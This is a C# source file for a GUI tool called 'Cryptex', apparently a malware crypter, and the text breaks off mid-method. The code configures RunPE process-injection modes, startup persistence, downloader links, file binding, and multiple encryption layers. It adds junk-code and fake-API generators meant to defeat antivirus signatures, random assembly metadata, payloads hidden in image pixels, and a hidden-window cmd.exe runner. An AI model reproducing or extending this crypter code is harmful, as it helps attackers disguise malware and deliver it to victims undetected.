using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.IO;
using System.Collections;
using System.IO.Compression;
using System.Threading;
using System.Reflection;
using System.Windows.Forms;
using System.Drawing.Imaging;
using System.Resources;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.CodeDom.Compiler;
using Microsoft.CSharp;


namespace Cryptex1
{

   


    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
           
            this.randomPool1.Event_0 += new Control14.Delegate1(this.method_46);
            this.randomPool2.Event_0 += new Control14.Delegate1(this.method_47);
            this.trkJunkCode.Event_0 += new Control1.Delegate0(this.method_52);
            this.trkFakeApi.Event_0 += new Control1.Delegate0(this.method_53);
            this.b1.Click += new EventHandler(this.b12232324_Click);
            this.b2.Click += new EventHandler(this.b12232324_Click);
            this.b3.Click += new EventHandler(this.b12232324_Click);
            this.b4.Click += new EventHandler(this.b12232324_Click);
            this.b11.Click += new EventHandler(this.b12232324_Click);
            this.b6.Click += new EventHandler(this.b12232324_Click);
            this.b7.Click += new EventHandler(this.b12232324_Click);
            this.b8.Click += new EventHandler(this.b12232324_Click);
            this.b9.Click += new EventHandler(this.b12232324_Click);
            this.b10.Click += new EventHandler(this.b12232324_Click);
            this.b12.Click += new EventHandler(this.b12232324_Click);
            this.picMn.MouseDown += new MouseEventHandler(this.picMn_MouseDown);
            this.picEnc.MouseDown += new MouseEventHandler(this.picEnc_MouseDown);
            this.picRunPE.MouseDown += new MouseEventHandler(this.picRunPE_MouseDown);
            this.picRest.MouseDown += new MouseEventHandler(this.picRest_MouseDown);
            this.pic1.DragDrop += new DragEventHandler(this.pic1_DragDrop);
            this.pic1.DragEnter += new DragEventHandler(this.pic1_DragEnter);
            this.pic2.DragDrop += new DragEventHandler(this.pic2_DragDrop);
            this.pic2.DragEnter += new DragEventHandler(this.pic2_DragEnter);
            this.pic3.DragDrop += new DragEventHandler(this.pic3_DragDrop);
            this.pic3.DragEnter += new DragEventHandler(this.pic3_DragEnter);
            this.pic4.DragDrop += new DragEventHandler(this.pic4_DragDrop);
            this.pic4.DragEnter += new DragEventHandler(this.pic4_DragEnter);
            
            
            this.method_22();
            this.method_31();
            this.pic1.AllowDrop = true;
            this.pic2.AllowDrop = true;
            this.pic3.AllowDrop = true;
            this.pic4.AllowDrop = true;
            string arg_58_0 = Application.StartupPath;
            base.SetStyle(ControlStyles.DoubleBuffer, false);
            this.method_3();
            this.method_30();
            Random random = new Random();
            this.txtMutex.Text = this.method_25(random.Next(15, 30));
            foreach (Control control in base.Controls)
            {
                if (control is Panel)
                {
                    control.Location = this.pan1.Location;
                }
            }
            base.Size = new Size(533, 345);
            this.method_29();
            this.pan4.Visible = true;
            this.pan8.Location = this.pictureBox3.Location;
            this.pan10.Location = this.pictureBox3.Location;
            this.pan7.Location = this.pictureBox3.Location;
            this.pan8.Visible = false;
            this.pan10.Visible = false;
            this.pan6.Location = this.pictureBox3.Location;
            this.pan4.Location = this.pan1.Location;
            this.pan3.Location = this.pan1.Location;
            if (!File.Exists(Path.GetDirectoryName(Environment.SystemDirectory) + "\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe"))
            {
                this.method_5("Vbc.exe (VisualBasic Compiler) was not found on your system, please fix it by going to Cryptex MainMenu and click \"Fixer\".");
            }
            if (!File.Exists(Path.GetDirectoryName(Environment.SystemDirectory) + "\\Microsoft.NET\\Framework\\v2.0.50727\\csc.exe"))
            {
                this.method_5("Csc.exe (CSharp Compiler) was not found on your system, please fix it by going to Cryptex MainMenu and click \"Fixer\".");
            }
            if (!File.Exists(Path.GetDirectoryName(Environment.SystemDirectory) + "\\Microsoft.NET\\Framework\\v2.0.50727\\ilasm.exe"))
            {
                this.method_5("ilasm.exe (IL code assembler) was not found on your system, please fix it by going to Cryptex MainMenu and click \"Fixer\".");
            }


           

        }

        [System.Flags]
        private enum Enum3
        {
            flag_0 = 1,
            flag_1 = 2,
            flag_2 = 4,
            flag_3 = 8,
            flag_4 = 16,
            flag_5 = 65536,
            flag_6 = 131072,
            flag_7 = 262144,
            flag_8 = 524288
        }


        internal static Dictionary<string, int> method0x60000af;

        [DllImport("user32.dll")]
        private static extern bool AnimateWindow(IntPtr intptr_0, int int_0, Enum3 enum3_0);


       



        private Random random_0 = new Random();







        public void method_0()
        {
            string value = "skype";
            string text = string.Empty;
            Process[] processes = Process.GetProcesses();
            for (int i = 0; i < processes.Length; i++)
            {
                Process process = processes[i];
                if (process.ProcessName.ToLower().Contains(value))
                {
                    int id = Process.GetProcessesByName(process.ProcessName.ToString())[0].Id;
                    text = Process.GetProcessById(id).MainModule.FileName;
                    MessageBox.Show(text);
                    if (text == Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\svchost.exe")
                    {
                        MessageBox.Show(id.ToString());
                    }
                    else
                    {
                        MessageBox.Show("nop");
                    }
                }
            }
        }
        public void method_1()
        {
            string text = this.txt111.Text;
            string a;
            if ((a = text) != null)
            {
                if (!(a == ""))
                {
                    return;
                }
                this.btnCrypt.Enabled = false;
            }
        }
        private void method_3()
        {
            string text = string.Empty;
            if (this.chckActiveX.Checked)
            {
                text += "-StartUp: ENABLED\r\n";
                text = text + "   ~Key value: " + this.textBoxStartup2.Text + "\r\n";
                text = text + "   ~File Name: " + this.rdbMinutes.Text + "\r\n";
            }
            else
            {
                text += "-StartUp: DISABLED\r\n";
            }
            if (this.lstDownloadLinks.Items.Count != 0)
            {
                text += "-Downldr: ENABLED\r\n";
                object obj = text;
                text = string.Concat(new object[]
       {
           obj, 
           "   ~Count: ", 
           this.lstDownloadLinks.Items.Count, 
           " Links\r\n"
       });
            }
            else
            {
                text += "-Downldr: DISABLED\r\n";
            }
            if (this.txtIcon.Text != string.Empty)
            {
                text += "-Icon: ENABLED\r\n";
            }
            else
            {
                text += "-Icon: DISABLED\r\n";
            }
            if (this.lstBind.Items.Count > 0)
            {
                text += "-Binder: ENABLED\r\n";
                object obj2 = text;
                text = string.Concat(new object[]
       {
           obj2, 
           "   ~Count: ", 
           this.lstBind.Items.Count, 
           " Files\r\n"
       });
            }
            else
            {
                text += "-Binder: DISABLED\r\n";
            }
            if (this.rdbUnicodeKey.Checked)
            {
                text += "File Type = .Net\r\n";
                text += "-RunPE = false\r\n";
            }
            else
            {
                text += "File Type = Native\r\n";
                if (this.rdbRunPE1.Checked)
                {
                    text += "-RunPE: 1\r\n";
                }
                if (this.rdbRunPE2.Checked)
                {
                    text += "-RunPE: 2\r\n";
                }
                if (this.rdbRunPE3.Checked)
                {
                    text += "-RunPE: 3\r\n";
                }
                if (this.rdbRunPE4.Checked)
                {
                    text += "-RunPE: 4\r\n";
                }
                if (this.rdbRunPE5.Checked)
                {
                    text += "-RunPE: 5\r\n";
                }
                if (this.rdbRunPE6.Checked)
                {
                    text += "-RunPE: 6\r\n";
                }
                if (this.rdbRunPE7.Checked)
                {
                    text += "-RunPE: 7\r\n";
                }
            }
            if (this.chckEOF.Checked)
            {
                text += "EOF = false\r\n";
            }
            else
            {
                text += "-EOF = true\r\n";
            }
            foreach (Control control in this.grpEncryption.Controls)
            {
                if ((control as RadioButton).Checked)
                {
                    text = text + "-Enc #1: " + (control as RadioButton).Name.Replace("rdb", "") + "\r\n";
                }
            }
            string text2 = "";
            foreach (Control control2 in this.groupEnc2.Controls)
            {
                if ((control2 as RadioButton).Checked)
                {
                    if ((control2 as RadioButton).Name.Contains("Letter"))
                    {
                        text2 += "Letters + Numbers";
                    }
                    if ((control2 as RadioButton).Name.Contains("Unicode"))
                    {
                        text2 += "Unicode";
                    }
                    if ((control2 as RadioButton).Name.Contains("Chin"))
                    {
                        text2 += "Chinese";
                    }
                }
            }
            text = text + "   ~Key Type: " + text2 + "\r\n";
            foreach (Control control3 in this.groupEnc2.Controls)
            {
                if ((control3 as RadioButton).Checked)
                {
                    text = text + "-Enc #2: " + (control3 as RadioButton).Name.Replace("rdb", "").Replace("2", "") + "\r\n";
                }
            }
            string text3 = string.Empty;
            foreach (Control control4 in this.groupBox22b.Controls)
            {
                if ((control4 as RadioButton).Checked)
                {
                    if ((control4 as RadioButton).Name.Contains("Letter"))
                    {
                        text3 += "Letters + Numbers";
                    }
                    if ((control4 as RadioButton).Name.Contains("Unicode"))
                    {
                        text3 += "Unicode";
                    }
                    if ((control4 as RadioButton).Name.Contains("Chin"))
                    {
                        text3 += "Chinese";
                    }
                }
            }
            text = text + "   ~Key Type: " + text3 + "\r\n";
            foreach (Control control5 in this.grpPicBtn.Controls)
            {
                if ((control5 as RadioButton).Checked)
                {
                    text = text + "-Stub Position: " + control5.Text + "\r\n";
                }
            }
            if (this.chckAssembly.Checked)
            {
                text += "-Custom Assembly: true\r\n";
            }
            else
            {
                text += "-Custom Assembly: false\r\n";
            }
            this.txtInformation.Text = text;
        }
        public void method_4(string string_0, int int_0)
        {
            string[] array = string_0.Split(new char[]
   {
       '»'
   });
            if (File.Exists(array[0]))
            {
                this.txtCryptFile.Text = array[0];
                if (smethod_5(this.txtCryptFile.Text))
                {
                    this.chckNETfile.Checked = true;
                }
            }
            else
            {
                this.method_5("File to crypt could not be found on this path:" + array[0]);
            }
            if (array[1] != "noicon")
            {
                if (File.Exists(array[1]))
                {
                    this.txtIcon.Text = array[1];
                    this.pictureBox1.Image = Icon.ExtractAssociatedIcon(this.txtIcon.Text).ToBitmap();
                }
                else
                {
                    this.method_5("The icon location is either wrong or the .ico does not exist");
                }
            }
            this.txtInjectInto.Text = array[2];
            string text = array[3];
            if (text.Contains("RC"))
            {
                this.rdbRC4.Checked = true;
            }
            if (text.Contains("Dex"))
            {
                this.rdbDex.Checked = true;
            }
            if (text.Contains("AES"))
            {
                this.rdbAES.Checked = true;
            }
            if (text.Contains("Bind1"))
            {
                this.rdbBind1.Checked = true;
            }
            if (text.Contains("Symetric"))
            {
                this.rdbSymetric.Checked = true;
            }
            if (text.Contains("Stairs"))
            {
                this.rdbStairs.Checked = true;
            }
            if (text.Contains("XOR"))
            {
                this.rdbXOR.Checked = true;
            }
            if (text.Contains("Dex"))
            {
                this.rdbDex.Checked = true;
            }
            if (text.Contains("Rinjdael"))
            {
                this.rdbRijndael.Checked = true;
            }
            if (text.Contains("TripleDES"))
            {
                this.rdbTripleDES.Checked = true;
            }
            if (text.Contains("RSM"))
            {
                this.rdbRSM.Checked = true;
            }
            if (text.Contains("PolyBaby"))
            {
                this.rdbPolyBaby.Checked = true;
            }
            if (text.Contains("PolyDex"))
            {
                this.rdbPolyDex.Checked = true;
            }
            if (text.Contains("Poly3DES"))
            {
                this.rdbPoly3DES.Checked = true;
            }
            if (text.Contains("PolyDES"))
            {
                this.rdbPolyDES.Checked = true;
            }
            if (text.Contains("PolyAES"))
            {
                this.rdbPolyAES.Checked = true;
            }
            if (text.Contains("PolyCloud"))
            {
                this.rdbPolyCloud.Checked = true;
            }
            if (text.Contains("PolyStairs"))
            {
                this.rdbPolyStairs.Checked = true;
            }
            if (text.Contains("PolyRC"))
            {
                this.rdbPolyRC2.Checked = true;
            }
            if (text.Contains("PolyRev"))
            {
                this.rdbPolyRev.Checked = true;
            }
            if (text.Contains("PolySym"))
            {
                this.rdbPolySym.Checked = true;
            }
            if (text.Contains("PolyRijn"))
            {
                this.rdbPolyRijn.Checked = true;
            }
            if (array[4] == "chinese")
            {
                this.rdbChinKey.Checked = true;
                this.txtKey.Text = this.method_24(50);
            }
            else
            {
                if (array[4] == "unicode")
                {
                    this.rdbUnicodeKey.Checked = true;
                    this.txtKey.Text = this.method_25(50);
                }
                else
                {
                    if (array[4] == "letters")
                    {
                        this.rdbLettersKey.Checked = true;
                        this.txtKey.Text = this.method_8(50);
                    }
                }
            }
            string text2 = array[5];
            if (text2.Contains("RC"))
            {
                this.rdbRC42.Checked = true;
            }
            if (text2.Contains("Dex"))
            {
                this.rdbDex2.Checked = true;
            }
            if (text2.Contains("AES"))
            {
                this.rdbAES2.Checked = true;
            }
            if (text2.Contains("Bind1"))
            {
                this.rdbCloud2.Checked = true;
            }
            if (text2.Contains("Symetric"))
            {
                this.rdbSymetric2.Checked = true;
            }
            if (text2.Contains("Stairs"))
            {
                this.rdbStairs2.Checked = true;
            }
            if (text2.Contains("XOR"))
            {
                this.rdbXOR2.Checked = true;
            }
            if (text2.Contains("Dex"))
            {
                this.rdbDex2.Checked = true;
            }
            if (text2.Contains("Rinjdael"))
            {
                this.rdbRijndael2.Checked = true;
            }
            if (text2.Contains("3DES"))
            {
                this.rdb3DES2.Checked = true;
            }
            if (text2.Contains("RSM"))
            {
                this.rdbRSM2.Checked = true;
            }
            if (text2.Contains("PolyBaby"))
            {
                this.rdbPolyBaby2.Checked = true;
            }
            if (text2.Contains("PolyDex"))
            {
                this.rdbPolyDex2.Checked = true;
            }
            if (text2.Contains("Poly3DES"))
            {
                this.rdbPoly3DES2.Checked = true;
            }
            if (text2.Contains("PolyDES"))
            {
                this.rdbPolyDES2.Checked = true;
            }
            if (text2.Contains("PolyAES"))
            {
                this.rdbPolyAES2.Checked = true;
            }
            if (text2.Contains("PolyCloud"))
            {
                this.rdbPolyCloud2.Checked = true;
            }
            if (text2.Contains("PolyStairs"))
            {
                this.rdbPolyStairs2.Checked = true;
            }
            if (text2.Contains("PolyRC"))
            {
                this.rdbPolyRC22.Checked = true;
            }
            if (text2.Contains("PolyRev"))
            {
                this.rdbPolyRev2.Checked = true;
            }
            if (text2.Contains("PolySym"))
            {
                this.rdbPolySym2.Checked = true;
            }
            if (text2.Contains("PolyRijn"))
            {
                this.rdbPolyRijn2.Checked = true;
            }
            if (array[6] == "chinese")
            {
                this.rdbChinKey2.Checked = true;
                this.txtKey2.Text = this.method_24(50);
            }
            else
            {
                if (array[6] == "unicode")
                {
                    this.rdbUnicodeKey2.Checked = true;
                    this.txtKey2.Text = this.method_25(50);
                }
                else
                {
                    if (array[6] == "letters")
                    {
                        this.rdbLetterKey2.Checked = true;
                        this.txtKey2.Text = this.method_8(50);
                    }
                }
            }
            if (array[7] == "yes")
            {
                this.chckEOF.Checked = true;
            }
            else
            {
                this.chckEOF.Checked = false;
            }
            if (array[8] == "yes")
            {
                this.chckHideFile.Checked = true;
            }
            else
            {
                this.chckHideFile.Checked = false;
            }
            if (array[9] == "yes")
            {
                this.chckSUp2.Checked = true;
                this.textBoxStartup2.Text = array[10];
                this.txtFileNameSU.Text = array[11];
            }
            else
            {
                this.chckSUp2.Checked = false;
            }
            if (array[12] == "yes")
            {
                this.rdbChinKey2.Checked = true;
                this.numUpDownDelay.Value = Convert.ToInt32(array[13]);
                if (array[14] == "min")
                {
                    this.rdbMinutes.Checked = true;
                }
                else
                {
                    this.rdbSeconds.Checked = true;
                }
            }
            else
            {
                this.rdbChinKey2.Checked = false;
            }
            if (array[15] == "yes")
            {
                this.chckAssembly.Checked = true;
                this.txtAssemblyTitle.Text = array[16];
                this.textAssemblyDescription.Text = array[17];
                this.textAssemblyCompany.Text = array[18];
                this.textAssemblyProduct.Text = array[19];
                this.textAssemblyCopyRight.Text = array[20];
                this.intMajor.Value = Convert.ToInt32(array[21]);
                this.intMinor.Value = Convert.ToInt32(array[22]);
                this.intBuild.Value = Convert.ToInt32(array[23]);
                this.intRevision.Value = Convert.ToInt32(array[24]);
            }
            else
            {
                this.chckAssembly.Checked = false;
            }
            if (array[25].Contains("1"))
            {
                this.rdbRunPE1.Checked = true;
            }
            if (array[25].Contains("2"))
            {
                this.rdbRunPE2.Checked = true;
            }
            if (array[25].Contains("3"))
            {
                this.rdbRunPE3.Checked = true;
            }
            if (array[25].Contains("4"))
            {
                this.rdbRunPE4.Checked = true;
            }
            if (array[25].Contains("5"))
            {
                this.rdbRunPE5.Checked = true;
            }
            if (array[25].Contains("6"))
            {
                this.rdbRunPE6.Checked = true;
            }
            if (array[25].Contains("7"))
            {
                this.rdbRunPE7.Checked = true;
            }
            if (array[26] == "unicode")
            {
                this.rdbUnicode.Checked = true;
            }
            else
            {
                this.rdbLetter.Checked = true;
            }
            this.numRandomStringLength.Value = Convert.ToInt32(array[27]);
            if (array[28] == "yes")
            {
                this.chkJunkCode.Checked = true;
                if (array[29] == "yes")
                {
                    this.chkArrayVariables.Checked = true;
                }
                else
                {
                    this.chkArrayVariables.Checked = false;
                }
                this.trkJunkCode.Int32_4 = Convert.ToInt32(array[30]);
            }
            else
            {
                this.chkJunkCode.Checked = false;
            }
            if (array[31] == "yes")
            {
                this.chkFakeAPI.Checked = true;
                this.trkFakeApi.Int32_4 = Convert.ToInt32(array[32]);
                this.numRandomStringLength.Value = Convert.ToInt32(array[33]);
            }
            else
            {
                this.chkFakeAPI.Checked = false;
            }
            if (int_0 != 4)
            {
                this.method_5("Settings " + int_0 + " loaded!");
                return;
            }
            this.method_5("Custom settings loaded!");
        }

        public void method_5(string string_0)
{
   AboutBox1 aboutBox = new AboutBox1();
   aboutBox.method_0(string_0);
   aboutBox.Show();
}
        private string method_8(int int_0)
{
   string text = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_1234567890";
   string text2 = "a";
   for (int i = 0; i < int_0; i++)
   {
       text2 += text[this.random_0.Next(0, text.Length)];
   }
   return text2;
}
        public void method_22()
{
   string[] files = Directory.GetFiles(Application.StartupPath, "*.resources", SearchOption.TopDirectoryOnly);
   string[] array = files;
   for (int i = 0; i < array.Length; i++)
   {
       string path = array[i];
       File.Delete(path);
   }
}
        private string method_24(int int_0)
{
   string text = "吧爸八百北不大岛的弟地东都对多儿二方港哥个关贵国过海好很会家见叫姐京九可老李零六吗妈么没美妹们明名哪那南你您朋七起千去人认日三上谁什生师识十是四他她台天湾万王我五西息系先香想小谢姓休学也一亿英友月再张这中字";
   string text2 = null;
   for (int i = 0; i < int_0; i++)
   {
       text2 += text[this.random_0.Next(0, text.Length)];
   }
   return text2;
}
        private string method_25(int int_0)
        {
            string text = "ƀƁƂƄƅƆƈƉƋƍƎƏƐƑƒƓƔƕƖƗƘƙƜƛơƣƥƪƩƱƲƳƴǍǎǢǣǤǥǭȄȜȞȣȮփռպֆӸӂҿҧ";
            string text2 = null;
            for (int i = 0; i < int_0; i++)
            {
                text2 += text[this.random_0.Next(0, text.Length)];
            }
            return text2;
        }
        private string method_26(int int_0, bool bool_0)
{
   string[] array = new string[]
   {
       "string", 
       "int", 
       "long", 
       "double", 
       "decimal", 
       "IntPtr", 
       "StringComparer", 
       "Array", 
       "Attribute", 
       "bool", 
       "byte", 
       "char", 
       "Boolean"
   };
   if (bool_0)
   {
       array = new string[]
       {
           "string", 
           "int", 
           "long", 
           "double", 
           "decimal", 
           "IntPtr", 
           "string[]", 
           "int[]", 
           "long[]", 
           "double[]", 
           "decimal[]", 
           "IntPtr[]", 
           "StringComparer", 
           "Array", 
           "Attribute", 
           "bool", 
           "bool[]", 
           "byte", 
           "byte[]", 
           "char", 
           "char[]", 
           "Boolean", 
           "Boolean[]"
       };
   }
   string text = "";
   for (int i = 0; i < int_0; i++)
   {
       string text2 = text;
       text = string.Concat(new string[]
       {
           text2, 
           array[this.random_0.Next(0, array.Length)], 
           " ", 
           this.method_8(30), 
           ";\r\n"
       });
   }
   return text;
}
        private string method_27(int int_0, int int_1)
{
   string[] array = new string[]
   {
       "string", 
       "int", 
       "long", 
       "double", 
       "decimal", 
       "IntPtr", 
       "string[]", 
       "int[]", 
       "long[]", 
       "double[]", 
       "decimal[]", 
       "IntPtr[]", 
       "StringComparer", 
       "Array", 
       "Attribute", 
       "bool", 
       "bool[]", 
       "byte", 
       "byte[]", 
       "char", 
       "char[]", 
       "Boolean", 
       "Boolean[]"
   };
   string text = "[DllImport(\"[DLL].dll\")] static extern [TYPE] [NAME]([PARAM1], [PARAM2]);";
   string text2 = "";
   for (int i = 0; i < int_0; i++)
   {
       string text3 = text;
       text3 = text3.Replace("[DLL]", this.method_8(int_1));
       text3 = text3.Replace("[TYPE]", array[this.random_0.Next(0, array.Length)]);
       text3 = text3.Replace("[NAME]", this.method_8(int_1));
       text3 = text3.Replace("[PARAM1]", array[this.random_0.Next(0, array.Length)] + " " + this.method_8(int_1));
       text3 = text3.Replace("[PARAM2]", array[this.random_0.Next(0, array.Length)] + " " + this.method_8(int_1));
       text2 = text2 + text3 + "\r\n";
   }
   return text2;
}
        private void method_29()
{
   foreach (Control control in base.Controls)
   {
       if (control is Panel)
       {
           control.Visible = false;
       }
   }
   this.pan1.Visible = false;
   this.pan2.Visible = false;
   this.pan3.Visible = false;
   this.pan4.Visible = false;
   this.pan6.Visible = false;
   this.pan8.Visible = false;
   this.pan5.Visible = false;
   this.pan7.Visible = false;
   this.pan8.Visible = false;
   this.pan9.Visible = false;
   this.pan10.Visible = false;
   this.pan11.Visible = false;
}
        private void method_30()
        {
            foreach (Control control in base.Controls)
            {
                if (control is Panel)
                {
                    control.Show();
                }
            }
        }

        public void method_31()
        {
            foreach (Control control in base.Controls)
            {
                if (control is Panel)
                {
                    AnimateWindow(control.Handle, 1, Enum3.flag_0 | Enum3.flag_7);
                    control.Visible = true;
                    control.Show();
                }
            }
        }

        private void method_34()
        {
            this.txtAssemblyTitle.Text = this.method_36();
            Thread.Sleep(50);
            this.textAssemblyDescription.Text = this.method_36();
            Thread.Sleep(50);
            this.textAssemblyCopyRight.Text = this.method_36();
            Thread.Sleep(50);
            this.textAssemblyCompany.Text = this.method_36();
            Thread.Sleep(50);
            this.textAssemblyProduct.Text = this.method_36();
            Thread.Sleep(50);
            this.intMajor.Value = new Random().Next(0, (int)this.intMajor.Maximum);
            Thread.Sleep(50);
            this.intMinor.Value = new Random().Next(0, (int)this.intMinor.Maximum);
            Thread.Sleep(50);
            this.intBuild.Value = new Random().Next(0, (int)this.intBuild.Maximum);
            Thread.Sleep(50);
            this.intRevision.Value = new Random().Next(0, (int)this.intRevision.Maximum);
        }
        private string method_35(double double_0)
        {
            string text = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVXYZ";
            Random random = new Random();
            int num = Convert.ToInt32(double_0);
            string text2 = null;
            for (int i = 0; i < num; i++)
            {
                text2 += text[random.Next(0, text.Length)];
            }
            return text2;
        }
        private string method_36()
        {
            string text = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVXYZ";
            Random random = new Random();
            int num = Convert.ToInt32(this.AssemblyLenght.Value);
            string text2 = null;
            for (int i = 0; i < num; i++)
            {
                text2 += text[random.Next(0, text.Length)];
            }
            return text2;
        }
        public byte[] method_42(byte[] byte_0, byte[] byte_1)
{
   Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_1, new byte[8], 1);
   RijndaelManaged rijndaelManaged = new RijndaelManaged();
   rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(16);
   rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(16);
   byte[] array = new byte[byte_0.Length + 16];
   Buffer.BlockCopy(Guid.NewGuid().ToByteArray(), 0, array, 0, 16);
   Buffer.BlockCopy(byte_0, 0, array, 16, byte_0.Length);
   return rijndaelManaged.CreateEncryptor().TransformFinalBlock(array, 0, array.Length);
}
        public Image method_44(string string_0)
{
   string_0 = Convert.ToBase64String(Encoding.UTF8.GetBytes(string_0));
   int num = Convert.ToInt32(Math.Sqrt((double)string_0.Length) + 2.0);
   Bitmap bitmap = new Bitmap(num, num);
   Graphics.FromImage(bitmap);
   int i = 0;
   while (i <= string_0.Length - 1)
   {
       for (int j = 1; j <= bitmap.Height - 1; j++)
       {
           for (int k = 1; k <= bitmap.Width - 1; k++)
           {
               if (i <= string_0.Length - 1)
               {
                   bitmap.SetPixel(k, j, Color.FromArgb(Convert.ToInt32(string_0[i]), 0, 0));
                   i++;
               }
           }
       }
   }
   return bitmap;
}
        private void method_46(object object_0, char char_0)
        {
            Control2 expr_06 = this.txtKey;
            expr_06.Text += char_0;
        }
        private void method_47(object object_0, char char_0)
        {
            Control2 expr_06 = this.txtKey2;
            expr_06.Text += char_0;
        }

        public string method_51(int int_0, int int_1)
        {
            Random random = new Random();
            string text = null;
            string text2 = "QWERTYUIOPASDFGHJKLZXCVBNM123456789";
            for (int i = 1; i <= random.Next(int_0 + 1, int_1); i++)
            {
                int index = Convert.ToInt32(text2.Length - 2) + 1;
                text += text2[index];
            }
            return text;
        }

        private void method_52(object object_0)
        {
            this.lblJunkAmount.Text = "Amount: " + Convert.ToString(this.trkJunkCode.Int32_4) + " lines";
        }
        private void method_53(object object_0)
        {
            this.lblApiAmount.Text = "Amount: " + Convert.ToString(this.trkFakeApi.Int32_4) + " API's";
        }









        public static string smethod_0(Image image_0)
        {
            string text = "";
            int num = image_0.Width - 1;
            int num2 = image_0.Height - 1;
            for (int i = 1; i <= num2; i++)
            {
                for (int j = 1; j <= num; j++)
                {
                    Color color = default(Color);
                    color = ((Bitmap)image_0).GetPixel(j, i);
                    text += Convert.ToChar(color.R);
                }
            }
            text = text.Replace("\\", "");
            text = text.Trim(new char[]
   {
       Convert.ToChar(0)
   });
            return text;
        }
        public static string smethod_1(Image image_0)
        {
            string text = "";
            int num = image_0.Width - 1;
            int num2 = image_0.Height - 1;
            for (int i = 1; i <= num2; i++)
            {
                for (int j = 1; j <= num; j++)
                {
                    Color color = default(Color);
                    color = ((Bitmap)image_0).GetPixel(j, i);
                    text += Convert.ToChar(color.R);
                }
            }
            text = text.Replace("\\", "");
            text = text.Trim(new char[]
   {
       Convert.ToChar(0)
   });
            byte[] bytes = Convert.FromBase64String(text);
            text = Encoding.UTF8.GetString(bytes);
            return smethod_11(text);
        }
        private static Image smethod_2(byte[] byte_0)
        {
            MemoryStream stream = new MemoryStream(byte_0);
            return Image.FromStream(stream);
        }
        public static string smethod_3(string string_0)
        {
            string[] array = string_0.Split(new char[]
   {
       '\\'
   });
            int num = array.Length;
            return array[num - 1];
        }
        private static byte[] smethod_4(Image image_0, ImageFormat imageFormat_0)
        {
            byte[] result;
            try
            {
                using (MemoryStream memoryStream = new MemoryStream())
                {
                    image_0.Save(memoryStream, imageFormat_0);
                    result = memoryStream.ToArray();
                }
            }
            catch (Exception)
            {
                throw;
            }
            return result;
        }
        private static bool smethod_5(string string_0)
        {
            try
            {
                bool flag;
                new Mutex(true, "[MUTEXTKEY]", out flag);
                if (!flag)
                {
                    Environment.Exit(Environment.ExitCode);
                }
                Assembly.LoadFrom(string_0);
                return true;
            }
            catch
            {
                return false;
            }
        }
        public static byte[] smethod_6(string string_0)
        {
            byte[] array = null;
            using (FileStream fileStream = new FileStream(string_0, FileMode.Open))
            {
                array = new byte[4];
                fileStream.Position = 60L;
                fileStream.Read(array, 0, 4);
                fileStream.Position = (long)(BitConverter.ToInt32(array, 0) + 6);
                array = new byte[2];
                fileStream.Read(array, 0, 2);
                fileStream.Position += (long)(256 + (BitConverter.ToInt16(array, 0) - 1) * 40);
                array = new byte[8];
                fileStream.Read(array, 0, 8);
                fileStream.Position = (long)(BitConverter.ToInt32(array, 0) + BitConverter.ToInt32(array, 4));
                array = new byte[(int)((object)((IntPtr)(fileStream.Length - fileStream.Position)))];
                fileStream.Read(array, 0, array.Length);
            }
            return array;
        }
        public static byte[] smethod_7(byte[] byte_0)
        {
            MemoryStream memoryStream = new MemoryStream();
            GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Compress, true);
            gZipStream.Write(byte_0, 0, byte_0.Length);
            gZipStream.Close();
            memoryStream.Position = 0L;
            new MemoryStream();
            byte[] array = new byte[(int)((object)((IntPtr)memoryStream.Length))];
            memoryStream.Read(array, 0, array.Length);
            byte[] array2 = new byte[array.Length + 4];
            Buffer.BlockCopy(array, 0, array2, 4, array.Length);
            Buffer.BlockCopy(BitConverter.GetBytes(byte_0.Length), 0, array2, 0, 4);
            return array2;
        }
        public static byte[] smethod_8(byte[] byte_0)
        {
            MemoryStream memoryStream = new MemoryStream();
            int num = BitConverter.ToInt32(byte_0, 0);
            memoryStream.Write(byte_0, 4, byte_0.Length - 4);
            byte[] array = new byte[num];
            memoryStream.Position = 0L;
            GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress);
            gZipStream.Read(array, 0, array.Length);
            return array;
        }
        private static void smethod_9(string string_0)
        {
            Process.Start(new ProcessStartInfo("cmd.exe", "/C " + string_0)
            {
                WindowStyle = ProcessWindowStyle.Hidden
            });
        }
        public static string smethod_10(string string_0)
        {
            byte[] bytes = Encoding.UTF8.GetBytes(string_0);
            MemoryStream memoryStream = new MemoryStream();
            GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Compress, true);
            gZipStream.Write(bytes, 0, bytes.Length);
            gZipStream.Close();
            memoryStream.Position = 0L;
            new MemoryStream();
            byte[] array = new byte[(int)((object)((IntPtr)memoryStream.Length))];
            memoryStream.Read(array, 0, array.Length);
            byte[] array2 = new byte[array.Length + 4];
            Buffer.BlockCopy(array, 0, array2, 4, array.Length);
            Buffer.BlockCopy(BitConverter.GetBytes(bytes.Length), 0, array2, 0, 4);
            return Convert.ToBase64String(array2);
        }
        public static string smethod_11(string string_0)
        {
            byte[] array = Convert.FromBase64String(string_0);
            MemoryStream memoryStream = new MemoryStream();
            int num = BitConverter.ToInt32(array, 0);
            memoryStream.Write(array, 4, array.Length - 4);
            byte[] array2 = new byte[num];
            memoryStream.Position = 0L;
            GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress);
            gZipStream.Read(array2, 0, array2.Length);
            return Encoding.UTF8.GetString(array2);
        }
        public static string smethod_12(Image image_0)
        {
            string text = "";
            int num = image_0.Width - 1;
            int num2 = image_0.Height - 1;
            for (int i = 1; i <= num2; i++)
            {
                for (int j = 1; j <= num; j++)
                {
                    Color color = default(Color);
                    color = ((Bitmap)image_0).GetPixel(j, i);
